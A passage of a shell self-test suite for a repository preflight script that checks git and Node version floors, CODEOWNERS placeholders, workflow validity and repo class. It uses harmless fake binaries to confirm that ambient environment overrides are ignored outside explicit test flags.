  # — S2: repo-class check (PREFLIGHT_GH_CMD seam) ————————————————————————————
  out=$(PREFLIGHT_GH_CMD='printf {"isPrivate":true,"isInOrganization":false}' check_repo_class 2>&1)
  case "$out" in *warn*PRIVATE*) echo "PASS: user-private repo warns (provenance skip)";; *) echo "FAIL: user-private repo did not warn ($out)"; fail=1;; esac

  out=$(PREFLIGHT_GH_CMD='printf {"isPrivate":false,"isInOrganization":false}' check_repo_class 2>&1)
  case "$out" in *ok*) echo "PASS: public repo ok, no warn";; *) echo "FAIL: public repo not ok ($out)"; fail=1;; esac

  out=$(PREFLIGHT_GH_CMD='printf {"isPrivate":true,"isInOrganization":true}' check_repo_class 2>&1)
  case "$out" in *ok*) echo "PASS: org-owned private ok (provenance runs via org)";; *) echo "FAIL: org repo not ok ($out)"; fail=1;; esac

  out=$(PREFLIGHT_GH_CMD='false' check_repo_class 2>&1)
  case "$out" in *skip*) echo "PASS: gh-failure degrades to skip";; *) echo "FAIL: gh-failure not skipped ($out)"; fail=1;; esac

  # WARN-only invariant: a warning must NOT set miss
  miss=0; PREFLIGHT_GH_CMD='printf {"isPrivate":true,"isInOrganization":false}' check_repo_class >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: repo-class warn leaves miss untouched"; else echo "FAIL: repo-class warn set miss"; fail=1; fi

  # — S2: CODEOWNERS placeholder check ————————————————————————————————————————
  _t=$(mktemp -d)
  printf '* @your-org/team\n' > "$_t/CODEOWNERS"
  out=$(CODEOWNERS_PATHS="$_t/CODEOWNERS" check_codeowners_placeholders 2>&1)
  case "$out" in *warn*your-org*) echo "PASS: @your-org placeholder warns";; *) echo "FAIL: placeholder not warned ($out)"; fail=1;; esac
  printf '* @real-team\n' > "$_t/CODEOWNERS"
  out=$(CODEOWNERS_PATHS="$_t/CODEOWNERS" check_codeowners_placeholders 2>&1)
  case "$out" in *ok*) echo "PASS: clean CODEOWNERS ok";; *) echo "FAIL: clean CODEOWNERS not ok ($out)"; fail=1;; esac
  out=$(CODEOWNERS_PATHS="$_t/none" check_codeowners_placeholders 2>&1)
  if [ -z "$out" ]; then echo "PASS: absent CODEOWNERS is N/A (no line)"; else echo "FAIL: absent CODEOWNERS printed ($out)"; fail=1; fi
  miss=0; printf '* @your-org/team\n' > "$_t/CODEOWNERS"; CODEOWNERS_PATHS="$_t/CODEOWNERS" check_codeowners_placeholders >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: codeowners warn leaves miss untouched"; else echo "FAIL: codeowners warn set miss"; fail=1; fi
  rm -rf "$_t"

  # — S2: workflow-validity check (delegates to actionlint-valid.sh) ——————————
  out=$(ACTIONLINT_VALID_CMD='true' check_workflows_valid 2>&1)
  case "$out" in *ok*workflows*) echo "PASS: valid workflows ok";; *) echo "FAIL: valid workflows not ok ($out)"; fail=1;; esac
  out=$(ACTIONLINT_VALID_CMD='false' check_workflows_valid 2>&1)
  case "$out" in *warn*workflow*) echo "PASS: invalid workflow warns (pointer to actionlint-valid)";; *) echo "FAIL: invalid workflow not warned ($out)"; fail=1;; esac
  out=$(ACTIONLINT_VALID_CMD='__skip__' check_workflows_valid 2>&1)
  case "$out" in *skip*) echo "PASS: unavailable check degrades to skip";; *) echo "FAIL: unavailable check not skipped ($out)"; fail=1;; esac
  miss=0; ACTIONLINT_VALID_CMD='false' check_workflows_valid >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: workflow warn leaves miss untouched"; else echo "FAIL: workflow warn set miss"; fail=1; fi

  # — T2: git version floor + `git merge-tree --write-tree` capability ————————————————
  # The floor exists because kit-update prefers `git merge-tree --write-tree` (git >= 2.38, 2022).
  # Ubuntu 20.04 ships git 2.25. DETECT AND DEGRADE: warn (never hard-fail) and NAME the escape.

  # THE NUMERIC-COMPARE PROOF (the whole reason this task exists): as strings "2.9" > "2.38".
  # Numerically 2.9 < 2.38. A string-naive floor would wave 2.9 through and be decorative.
  if git_meets_floor 2 38 2>/dev/null; then echo "PASS: 2.38 meets the 2.38 floor (boundary, inclusive)"; else echo "FAIL: 2.38 rejected by its own floor"; fail=1; fi
  if git_meets_floor 2 9 2>/dev/null; then echo "FAIL: 2.9 accepted — STRING-NAIVE compare ('2.9' > '2.38' lexically)"; fail=1; else echo "PASS: 2.9 rejected (numeric compare: 9 < 38)"; fi
  if git_meets_floor 2 39 2>/dev/null; then echo "PASS: 2.39 meets the floor"; else echo "FAIL: 2.39 rejected"; fail=1; fi
  if git_meets_floor 1 99 2>/dev/null; then echo "FAIL: 1.99 accepted (major below floor)"; fail=1; else echo "PASS: 1.99 rejected (major 1 < 2)"; fi
  if git_meets_floor 3 0 2>/dev/null; then echo "PASS: 3.0 meets the floor (major above)"; else echo "FAIL: 3.0 rejected (major above floor)"; fail=1; fi

  # the parser: real-world `git --version` shapes -> "MAJOR MINOR"
  out=$(git_version_parts "git version 2.39.5 (Apple Git-154)" 2>&1) || out="<git_version_parts absent/errored>"
  case "$out" in "2 39") echo "PASS: parses 'git version 2.39.5 (Apple Git-154)' -> 2 39";; *) echo "FAIL: Apple git line parsed as '$out'"; fail=1;; esac
  out=$(git_version_parts "git version 2.25.1" 2>&1) || out="<absent>"
  case "$out" in "2 25") echo "PASS: parses 'git version 2.25.1' -> 2 25";; *) echo "FAIL: 2.25.1 parsed as '$out'"; fail=1;; esac
  out=$(git_version_parts "git version 2.9.5" 2>&1) || out="<absent>"
  case "$out" in "2 9") echo "PASS: parses 'git version 2.9.5' -> 2 9";; *) echo "FAIL: 2.9.5 parsed as '$out'"; fail=1;; esac
  out=$(git_version_parts "git version 2.41.0.windows.3" 2>&1) || out="<absent>"
  case "$out" in "2 41") echo "PASS: parses the Windows build string -> 2 41";; *) echo "FAIL: windows line parsed as '$out'"; fail=1;; esac
  if git_version_parts "git version banana" >/dev/null 2>&1; then echo "FAIL: unparseable version accepted"; fail=1; else echo "PASS: unparseable version rejected (rc 1)"; fi

  # the check: below the floor -> WARN naming the version AND the fallback (the escape)
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.25.1' check_git_capability 2>&1) || out="<check_git_capability absent/errored>"
  case "$out" in *warn*2.25*) echo "PASS: old git warns and names the version found";; *) echo "FAIL: old git did not warn with its version ($out)"; fail=1;; esac
  case "$out" in *fallback*) echo "PASS: old-git warning names the temporary-worktree fallback (the escape)";; *) echo "FAIL: warning does not name the fallback ($out)"; fail=1;; esac
  case "$out" in *non-mutating*) echo "PASS: old-git warning states the fallback is still non-mutating";; *) echo "FAIL: warning does not state non-mutating ($out)"; fail=1;; esac

  # 2.9 is the trap case end-to-end, not just in the comparator
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.9.5' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *warn*2.9*fallback*) echo "PASS: git 2.9.5 warns (a string compare would have passed it)";; *) echo "FAIL: git 2.9.5 not warned ($out)"; fail=1;; esac

  # at/above the floor -> ok, no warning
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.38.0' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *ok*2.38*) echo "PASS: git 2.38.0 ok (boundary)";; *) echo "FAIL: git 2.38.0 not ok ($out)"; fail=1;; esac
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.48.1' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *ok*merge-tree*) echo "PASS: modern git ok and names merge-tree";; *) echo "FAIL: modern git not ok ($out)"; fail=1;; esac

  # degrade, never crash: unparseable / absent git -> skip
  out=$(PREFLIGHT_GIT_VERSION_CMD='echo git version banana' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *skip*) echo "PASS: unparseable git version degrades to skip";; *) echo "FAIL: unparseable version not skipped ($out)"; fail=1;; esac
  out=$(PREFLIGHT_GIT_VERSION_CMD='false' check_git_capability 2>&1) || out="<absent>"
  case "$out" in *skip*) echo "PASS: unavailable git degrades to skip";; *) echo "FAIL: absent git not skipped ($out)"; fail=1;; esac

  # WARN-only invariant: the floor is advisory — it must NEVER set miss (i.e. never fail the run)
  miss=0; PREFLIGHT_GIT_VERSION_CMD='echo git version 2.25.1' check_git_capability >/dev/null 2>&1 || true
  if [ "$miss" -eq 0 ]; then echo "PASS: git-floor warn leaves miss untouched"; else echo "FAIL: git-floor warn set miss (hard-failed old git)"; fail=1; fi
  miss=0

  # NO AMBIENT SPOOF (flag-not-env): in a REAL run — no --selftest, no --selftest-e2e — an ambient
  # PREFLIGHT_GIT_VERSION_CMD must be IGNORED. The seam exists for the tests; if the environment alone
  # can redirect it, a stale/hostile export in an adopter's shell rewrites what preflight reports about
  # their machine. Advisory-only, so no privilege boundary is crossed — but it is the same flag-not-env
  # rule --date honors (an ambient INCEPT_DATE was rejected for exactly this reason), and a check that
  # can be told what to see is not a check.
  #
  # MARKER, NOT VERSION-STRING: the seam command TOUCHES a file, and we assert the file was not created.
  # Keying on the OUTPUT instead (`case "$spoof" in *"git 2.25"*)`) reads the HOST's git: a machine whose
  # real git is 2.25.x — Ubuntu 20.04, the exact platform this floor was written for — legitimately prints
  # `warn git 2.25 ...`, and the assertion would call its own honest report an attack. CI (git 2.4x) would
  # never see it. A false-RED generator is the same defect class as a vacuous green, inverted. So assert
  # the CLAIM ("did the seam command RUN?") rather than a proxy the environment is allowed to satisfy.
  _sd=$(mktemp -d); _marker="$_sd/ran"
  printf '#!/bin/sh\ntouch "%s"\necho git version 2.25.1\n' "$_marker" > "$_sd/fakegit"
  chmod +x "$_sd/fakegit"
  PREFLIGHT_GIT_VERSION_CMD="$_sd/fakegit" PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' sh "$0" >/dev/null 2>&1 || true
  if [ -e "$_marker" ]; then
    echo "FAIL: an AMBIENT PREFLIGHT_GIT_VERSION_CMD was honored in a real run (env, not flag)"; fail=1
  else
    echo "PASS: a real run IGNORES an ambient PREFLIGHT_GIT_VERSION_CMD (the seam needs an explicit flag)"
  fi
  rm -rf "$_sd"

  # NO GLOB: the version line is word-SPLIT, never pathname-expanded. `for _w in $1` unquoted splits AND
  # globs; a '*' in the string would expand against the CWD, so a file named e.g. '9.9.9' sitting in the
  # working directory becomes the "version" — a floor that reads the filesystem instead of git. (Quoting
  # $1 is not the fix: it would collapse the line to one word and parse nothing. Disabling globbing is.)
  _gt=$(mktemp -d)
  : > "$_gt/9.9.9"
  out=$( cd "$_gt" && git_version_parts "git version * 2.25.1" 2>&1 ) || out="<absent>"
  case "$out" in
    "2 25") echo "PASS: a '*' in the version line does NOT glob against the cwd (2 25, not the filename)" ;;
    *) echo "FAIL: the version line was GLOB-expanded — parsed '$out' from the filesystem"; fail=1 ;;
  esac
  rm -rf "$_gt"

  # WIRED end-to-end: a REAL preflight run (not just the unit seam) must name the git version and,
  # below the floor, the fallback — and must not change the run's verdict. A defined-but-uncalled check
  # is decorative. `--selftest-e2e` runs the REAL body with the injection seams live (the flag IS the
  # authorization — see the no-ambient-spoof assert above).
  e2e_rc=0
  e2e=$(PREFLIGHT_GIT_VERSION_CMD='echo git version 2.25.1' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' sh "$0" --selftest-e2e 2>&1) || e2e_rc=$?
  case "$e2e" in *warn*2.25*fallback*) echo "PASS: real preflight run names the git version + the fallback";; *) echo "FAIL: real run did not surface the git floor (rc=$e2e_rc)"; fail=1;; esac
  # DIFFERENTIAL, not absolute: `[ "$e2e_rc" -eq 0 ]` would assert a whole preflight run exits 0, which
  # folds in the AMBIENT environment (the CP-4 non-root refusal, a missing jq) — it reddens for reasons
  # that have nothing to do with the git floor. A false-RED generator is the same defect class as a
  # vacuous green, inverted. The claim is "the floor is ADVISORY", so assert exactly that: an old git
  # does not CHANGE preflight's exit code, whatever that code is in this environment.
  new_rc=0
  PREFLIGHT_GIT_VERSION_CMD='echo git version 2.48.1' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' sh "$0" --selftest-e2e >/dev/null 2>&1 || new_rc=$?
  if [ "$e2e_rc" -eq "$new_rc" ]; then echo "PASS: the git floor does not change preflight's exit code (advisory, not blocking)"; else echo "FAIL: old git CHANGED the exit code (old=$e2e_rc modern=$new_rc)"; fail=1; fi

  # — T5 (CP-7 K3/K5): the DECLARED Node floor is ENFORCED, not merely declared ————————————
  # Field defect (cold run 4): preflight checked only that `node` EXISTS, so an operator on Node 20.10
  # got a green "All prerequisites present."; `npm ci` then proceeded on an EBADENGINE *warning* and the
  # failure surfaced deep inside Rolldown as `node:util.styleText` — unreadable as a version problem.
  # Policy (owner-ratified): HARD-FAIL WITH A NAMED ESCAPE. These cases lock every leg of it.

  # the parser: real `node --version` and .nvmrc shapes -> MAJOR
  out=$(node_major "v24.18.0" 2>&1) || out="<node_major absent/errored>"
  case "$out" in "24") echo "PASS: parses 'v24.18.0' -> 24";; *) echo "FAIL: v24.18.0 parsed as '$out'"; fail=1;; esac
  out=$(node_major "v20.20.2" 2>&1) || out="<absent>"
  case "$out" in "20") echo "PASS: parses 'v20.20.2' -> 20";; *) echo "FAIL: v20.20.2 parsed as '$out'"; fail=1;; esac
  out=$(node_major "24" 2>&1) || out="<absent>"
  case "$out" in "24") echo "PASS: parses a bare '24' (the .nvmrc shape) -> 24";; *) echo "FAIL: bare '24' parsed as '$out'"; fail=1;; esac
  out=$(node_major "v9.11.2" 2>&1) || out="<absent>"
  case "$out" in "9") echo "PASS: parses 'v9.11.2' -> 9 (the lexical-trap case)";; *) echo "FAIL: v9.11.2 parsed as '$out'"; fail=1;; esac
  if node_major "lts/iron" >/dev/null 2>&1; then echo "FAIL: a moving alias ('lts/iron') was accepted as a version"; fail=1; else echo "PASS: 'lts/iron' is unparseable (rc 1) — no invented floor"; fi
  if node_major "" >/dev/null 2>&1; then echo "FAIL: empty version accepted"; fail=1; else echo "PASS: empty version rejected (rc 1)"; fi

  # NO GLOB (same landmine as git_version_parts): the version line is word-SPLIT, never pathname-expanded.
  # A '*' would otherwise expand against the cwd, so a file named '99.9.9' would BE the running version —
  # a floor reading the filesystem instead of the runtime, and one that silences a real refusal.
  _ng=$(mktemp -d)
  : > "$_ng/99.9.9"
  out=$( cd "$_ng" && node_major "* v20.20.2" 2>&1 ) || out="<absent>"
  case "$out" in
    "20") echo "PASS: a '*' in the version line does NOT glob against the cwd (20, not the filename)" ;;
    *) echo "FAIL: the node version line was GLOB-expanded — parsed '$out' from the filesystem"; fail=1 ;;
  esac
  rm -rf "$_ng"

  # the floor reader: profiles/<stack>/scaffold/.nvmrc is the SINGLE source (no sixth declaration)
  _rt=$(mktemp -d)
  printf '24\n' > "$_rt/plain"
  out=$(read_runtime_floor "$_rt/plain" 2>&1) || out="<read_runtime_floor absent/errored>"
  case "$out" in "24") echo "PASS: reads a plain '24' .nvmrc -> floor 24";; *) echo "FAIL: plain .nvmrc read as '$out'"; fail=1;; esac
  printf 'v24.4.0\n' > "$_rt/vform"
  out=$(read_runtime_floor "$_rt/vform" 2>&1) || out="<absent>"
  case "$out" in "24") echo "PASS: reads a 'v24.4.0' .nvmrc -> floor 24";; *) echo "FAIL: v-form .nvmrc read as '$out'"; fail=1;; esac
  printf '# pinned by the profile\n\n24\n' > "$_rt/commented"
  out=$(read_runtime_floor "$_rt/commented" 2>&1) || out="<absent>"
  case "$out" in "24") echo "PASS: skips comments/blank lines in .nvmrc -> floor 24";; *) echo "FAIL: commented .nvmrc read as '$out'"; fail=1;; esac
  printf 'lts/iron\n' > "$_rt/alias"
  if read_runtime_floor "$_rt/alias" >/dev/null 2>&1; then echo "FAIL: an 'lts/iron' .nvmrc yielded a floor"; fail=1; else echo "PASS: an unparseable .nvmrc is rc 1 (caller must WARN, not invent a floor)"; fi
  if read_runtime_floor "$_rt/nope" >/dev/null 2>&1; then echo "FAIL: a missing .nvmrc yielded a floor"; fail=1; else echo "PASS: a missing .nvmrc is rc 1"; fi
  if read_runtime_floor "$_rt" >/dev/null 2>&1; then echo "FAIL: a directory yielded a floor"; fail=1; else echo "PASS: an unreadable (directory) .nvmrc is rc 1"; fi

  # AT/ABOVE the floor -> ok, and NEITHER refusal nor waiver is armed
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v24.18.0'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  case "$out" in *ok*"meets the Node 24 floor"*) echo "PASS: an in-floor runtime reports ok and states the version";; *) echo "FAIL: in-floor runtime not reported ok ($out)"; fail=1;; esac
  if [ "$RUNTIME_REFUSE" -eq 0 ] && [ "$RUNTIME_WAIVED" -eq 0 ] && [ "$miss" -eq 0 ] && [ "$rec" -eq 0 ]; then
    echo "PASS: an in-floor runtime arms nothing (no refusal, no waiver, no warn)"
  else echo "FAIL: in-floor runtime armed something (refuse=$RUNTIME_REFUSE waive=$RUNTIME_WAIVED miss=$miss rec=$rec)"; fail=1; fi

  # BELOW the floor, no escape -> REFUSE (this is the whole point: the green is gone)
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  if [ "$RUNTIME_REFUSE" -eq 1 ] && [ "$RUNTIME_WAIVED" -eq 0 ]; then echo "PASS: a below-floor runtime REFUSES by default"; else echo "FAIL: below-floor runtime did not refuse (refuse=$RUNTIME_REFUSE waive=$RUNTIME_WAIVED)"; fail=1; fi
  case "$out" in *v20.20.2*24*) echo "PASS: the below-floor line names BOTH the running version and the floor";; *) echo "FAIL: below-floor line does not name both versions ($out)"; fail=1;; esac

  # THE NUMERIC-COMPARE PROOF: lexically "9" > "24", so a string-naive floor would wave Node 9 through.
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v9.11.2'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  if [ "$RUNTIME_REFUSE" -eq 1 ]; then echo "PASS: node 9 refused against a 24 floor (numeric compare: 9 < 24)"; else echo "FAIL: node 9 accepted — STRING-NAIVE compare ('9' > '24' lexically)"; fail=1; fi

  # THE NAMED ESCAPE: --allow-runtime-mismatch proceeds, loudly, and NEVER silently
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=1; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  ALLOW_RUNTIME_MISMATCH=0
  out=$(cat "$_rt/out")
  if [ "$RUNTIME_WAIVED" -eq 1 ] && [ "$RUNTIME_REFUSE" -eq 0 ]; then echo "PASS: --allow-runtime-mismatch waives the refusal and records the waiver"; else echo "FAIL: escape did not waive (refuse=$RUNTIME_REFUSE waive=$RUNTIME_WAIVED)"; fail=1; fi
  case "$out" in *WARN*) echo "PASS: the waived run WARNs loudly";; *) echo "FAIL: waived run did not WARN ($out)"; fail=1;; esac
  case "$out" in *UNSUPPORTED*) echo "PASS: the waived run says UNSUPPORTED in as many words";; *) echo "FAIL: waived run does not say UNSUPPORTED ($out)"; fail=1;; esac
  if [ "$miss" -eq 0 ]; then echo "PASS: the waiver does not set miss (it proceeds — that is the escape)"; else echo "FAIL: waiver set miss"; fail=1; fi

  # .nvmrc ABSENT on a Node stack -> WARN WITH THE REASON. Fail-safe toward disclosure: never a silent
  # skip, and never a version-verified green we did not earn.
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v24.18.0'
  check_runtime_floor typescript-node "$_rt/nope" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  case "$out" in *warn*UNVERIFIED*) echo "PASS: a missing .nvmrc WARNs that the floor is UNVERIFIED";; *) echo "FAIL: missing .nvmrc did not warn UNVERIFIED ($out)"; fail=1;; esac
  case "$out" in *"$_rt/nope"*) echo "PASS: the UNVERIFIED warning names the path it could not read (the reason)";; *) echo "FAIL: warning does not name the unreadable path ($out)"; fail=1;; esac
  if [ "$miss" -eq 0 ] && [ "$RUNTIME_REFUSE" -eq 0 ]; then echo "PASS: an unreadable floor warns without hard-failing (disclosure, not refusal)"; else echo "FAIL: unreadable floor set miss/refuse (miss=$miss refuse=$RUNTIME_REFUSE)"; fail=1; fi
  if [ "$rec" -eq 1 ]; then echo "PASS: the UNVERIFIED warning is counted as an advisory (rec)"; else echo "FAIL: UNVERIFIED warning not counted ($rec)"; fail=1; fi

  # node absent / unreadable version -> WARN, never a crash and never a silent pass
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='false'
  check_runtime_floor typescript-node "$_rt/plain" > "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  case "$out" in *warn*UNVERIFIED*) echo "PASS: an unrunnable 'node --version' degrades to an UNVERIFIED warn";; *) echo "FAIL: unrunnable node not warned ($out)"; fail=1;; esac
  if [ "$RUNTIME_REFUSE" -eq 0 ]; then echo "PASS: an unrunnable node does not fabricate a refusal"; else echo "FAIL: unrunnable node refused"; fail=1; fi

  # PER-STACK, NOT GLOBAL: a stack that does not run on node is completely unaffected — no line at all.
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; ALLOW_RUNTIME_MISMATCH=0; miss=0; rec=0
  PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2'
  check_runtime_floor go "$_rt/plain" > "$_rt/out" 2>&1 || true
  check_runtime_floor __nope__ "$_rt/plain" >> "$_rt/out" 2>&1 || true
  unset PREFLIGHT_NODE_VERSION_CMD
  out=$(cat "$_rt/out")
  if [ -z "$out" ] && [ "$RUNTIME_REFUSE" -eq 0 ] && [ "$rec" -eq 0 ]; then
    echo "PASS: a non-Node stack (and an unknown stack) is untouched by the Node floor"
  else echo "FAIL: non-Node stack affected (out='$out' refuse=$RUNTIME_REFUSE rec=$rec)"; fail=1; fi
  RUNTIME_REFUSE=0; RUNTIME_WAIVED=0; miss=0; rec=0
  rm -rf "$_rt"

  # WIRED end-to-end. The direct calls above prove the FUNCTION; they cannot see the `exit 1` wiring in
  # the main path, and a defined-but-unacted-on check is decorative (the exact class that shipped twice
  # in this repo). Drive all three legs through the REAL body via --selftest-e2e.
  rf_bad_rc=0
  rf_bad=$(PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$0" --selftest-e2e --stack typescript-node 2>&1) || rf_bad_rc=$?
  case "$rf_bad" in *v20.20.2*) echo "PASS: a real below-floor run names the RUNNING version";; *) echo "FAIL: real run did not name the running version (rc=$rf_bad_rc): $rf_bad"; fail=1;; esac
  case "$rf_bad" in *"Node 24"*|*"node >= 24"*|*">= 24"*) echo "PASS: a real below-floor run names the REQUIRED floor";; *) echo "FAIL: real run did not name the floor: $rf_bad"; fail=1;; esac
  case "$rf_bad" in *--allow-runtime-mismatch*) echo "PASS: the refusal NAMES the escape in the same message (signpost, don't relax)";; *) echo "FAIL: refusal does not name --allow-runtime-mismatch: $rf_bad"; fail=1;; esac
  if [ "$rf_bad_rc" -ne 0 ]; then echo "PASS: a real below-floor run EXITS NON-ZERO (the wiring, not just the function)"; else echo "FAIL: below-floor run exited 0 — the check is decorative"; fail=1; fi
  case "$rf_bad" in *"All prerequisites present"*) echo "FAIL: a refused run still printed the green"; fail=1;; *) echo "PASS: a refused run prints NO 'All prerequisites present' green";; esac

  rf_ok_rc=0
  rf_ok=$(PREFLIGHT_NODE_VERSION_CMD='echo v24.18.0' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$0" --selftest-e2e --stack typescript-node 2>&1) || rf_ok_rc=$?
  case "$rf_ok" in *"meets the Node 24 floor"*) echo "PASS: a real in-floor run states the version it verified";; *) echo "FAIL: in-floor run did not state the verified floor (rc=$rf_ok_rc): $rf_ok"; fail=1;; esac

  rf_esc_rc=0
  rf_esc=$(PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$0" --selftest-e2e --stack typescript-node --allow-runtime-mismatch 2>&1) || rf_esc_rc=$?
  case "$rf_esc" in *UNSUPPORTED*) echo "PASS: a real waived run says UNSUPPORTED";; *) echo "FAIL: waived run does not say UNSUPPORTED (rc=$rf_esc_rc): $rf_esc"; fail=1;; esac
  # A SUPPRESSED REFUSAL MUST NEVER READ AS A PASS. DIFFERENTIAL, not absolute: assert the green is
  # absent under the escape *given that the same environment prints it in-floor* — an absolute assert
  # would false-RED on a machine that fails preflight for an unrelated ambient reason.
  if printf '%s' "$rf_ok" | grep -q 'All prerequisites present'; then
    case "$rf_esc" in
      *"All prerequisites present"*) echo "FAIL: the escape printed the clean green — a suppressed refusal read as a pass"; fail=1 ;;
      *) echo "PASS: the same environment prints the green in-floor but NOT under the escape (differential)" ;;
    esac
  else
    echo "PASS: (weak) this environment prints no green even in-floor — the green/no-green differential is not observable here"
  fi

  # PER-STACK end-to-end: a non-Node stack run below the Node floor is unaffected by it.
  rf_go=$(PREFLIGHT_NODE_VERSION_CMD='echo v20.20.2' PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$0" --selftest-e2e --stack go 2>&1) || true
  case "$rf_go" in *"Node"*"floor"*) echo "FAIL: a go run was judged against the Node floor: $rf_go"; fail=1;; *) echo "PASS: a non-Node stack run is unaffected end-to-end";; esac

  # NO AMBIENT SPOOF (flag-not-env) — load-bearing HERE in a way it is not for the advisory git floor:
  # this check BLOCKS, so an ambient export that could tell it "you are on Node 24" would turn a refusal
  # into a pass. MARKER, NOT VERSION-STRING (the git-floor lesson): assert the seam command never RAN,
  # rather than keying on output the host's real node is entitled to produce.
  _nd=$(mktemp -d); _nmarker="$_nd/ran"
  printf '#!/bin/sh\ntouch "%s"\necho v24.18.0\n' "$_nmarker" > "$_nd/fakenode"
  chmod +x "$_nd/fakenode"
  PREFLIGHT_NODE_VERSION_CMD="$_nd/fakenode" PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
    sh "$0" --stack typescript-node >/dev/null 2>&1 || true
  if [ -e "$_nmarker" ]; then
    echo "FAIL: an AMBIENT PREFLIGHT_NODE_VERSION_CMD was honored in a real run (env, not flag) — a blocking check the environment can redirect"; fail=1
  else
    echo "PASS: a real run IGNORES an ambient PREFLIGHT_NODE_VERSION_CMD (the seam needs an explicit flag)"
  fi
  rm -rf "$_nd"

  # — K11 (CP7R5): the pre-push runtime guard must be IN FORCE, not merely provided ————————————
  # git clones neither .git/hooks/ nor .git/config, so an incepted repo's guard is ABSENT in every fresh
  # clone. That is by design (hooks/pre-push:4 — "A SPEED BUMP, not a boundary"); the defect is that the
  # absence is SILENT, and in the CP-7 run-4 cold field test that silence let a real push land on
  # protected main. These legs prove the DETECTION ONLY — that check_guard_installed classifies four hook
  # states correctly on real fixture trees. They prove NOTHING about whether the check is REACHED in a
  # real run (a leg placed after an early exit would still pass every one of them); that is a separate,
  # main-path proof.
  #
  # SECOND CEILING — nothing MUTATES these automatically. conformance/non-vacuity.sh does not reach them:
  # its target set is the `^check control` rows of conformance/verify.sh (non-vacuity.sh:282), and
  # scripts/preflight.sh is not one of them (only conformance/adopter-preflight-wired.sh is —
  # verify.sh:99). So every assertion below must carry its OWN kill decision; "the sweep would have
  # caught it" is not available here.
  #
  # But the legs themselves have THREE teeth, not two, and the third is the strongest — measured, not
  # assumed (2026-07-21):
  #   1. `sh scripts/preflight.sh --selftest`, wired as a CI step at ci.yml:167;
  #   2. hand mutation-testing (this comment's own discipline);
  #   3. conformance/adopter-preflight-wired.sh:26 runs `sh "$PF" --selftest` and its :30 REQUIRES the
  #      literal `OK: preflight selftest` — and that script is a `check control` row at verify.sh:99.
  # Tooth 3 makes the blast radius conformance/verify.sh, which ADOPTERS run, not a single CI step.
  # HISTORICAL, CORRECTED (T2 fix-loop, finding J6): this paragraph used to say "while guard_tree_class's
  # body is `:`, this selftest exits 1, so verify.sh's `adopter-preflight` row is RED BY CONSTRUCTION
  # until the owner writes that predicate" — the deliberate red state of the T1 slice. The owner wrote
  # that predicate; the body is no longer `:` and the row is green. The sentence stayed true only
  # VACUOUSLY, as a conditional whose premise had ended, which is the same class of stale comment this
  # very file keeps paying for. The durable half is the reason it was written: a comment that understates
  # which gates a leg binds is "a comment standing in for execution", so tooth 3 is stated, not the
  # obsolete red state.
  #
  # Each leg runs the check in a SUBSHELL with cwd = the fixture, because `git rev-parse --git-path` reads
  # the cwd. cd-ing in THIS shell instead would leave the relative `sh "$0"` re-invocations above
  # unresolvable if a leg ever aborted mid-way. A subshell cannot propagate GUARD_REFUSE/GUARD_STATE back
  # to the parent, so it prints them as a trailer — the armed flag IS this function's refusal signal (it
  # returns 0 on every path; the exit-1 wiring is the refusal block in the main body — grep
